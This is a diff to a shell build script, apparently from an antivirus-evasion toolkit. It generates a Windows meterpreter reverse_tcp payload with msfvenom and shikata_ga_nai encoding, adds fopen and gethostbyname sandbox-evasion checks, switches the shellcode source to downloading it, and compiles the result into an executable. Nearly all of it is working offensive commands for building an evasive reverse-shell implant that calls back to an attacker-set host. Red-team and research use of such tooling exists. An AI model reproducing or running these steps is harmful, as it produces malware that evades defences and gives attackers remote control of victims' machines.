@@ -15,7 +15,7 @@ LHOST=$GLOBAL_LHOST
 
 # generate payload
 #msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
-msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > thepayload.bin
+msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > output/thepayload.bin
 
 # import feature construction interface
 . build/feature_construction.sh
@@ -23,11 +23,15 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shi
 # add fopen sandbox evasion feature
 add_feature fopen_sandbox_evasion
 
+# add gethostbyname killswitch evasion feature
+append_value KVALUE localhost source/techniques.h
+add_feature gethostbyname_sandbox_evasion
+
 # hide console window
 #add_feature hide_console
 
 # set shellcode source
-shellcode_source internet_explorer
+shellcode_source downloadsc
 
 # set shellcode binding technique
 shellcode_binding exec_shellcode
@@ -35,13 +39,10 @@ shellcode_binding exec_shellcode
 # enable debug printing
 append_value PRINT_DEBUG "" source/shellcode_binding.h	
 
-# add gethostbyname killswitch evasion feature
-#append_value KVALUE localhost
-#add_feature gethostbyname_sandbox_evasion
-
 # compile
-$win32_compiler -o output/pwn.exe source/avet.c
+$win32_compiler -o output/pwn.exe source/avet.c -lws2_32
 
 # cleanup
-# rm sc.txt
+rm output/thepayload.bin
+rm output/pwn.exe
 cleanup_techniques
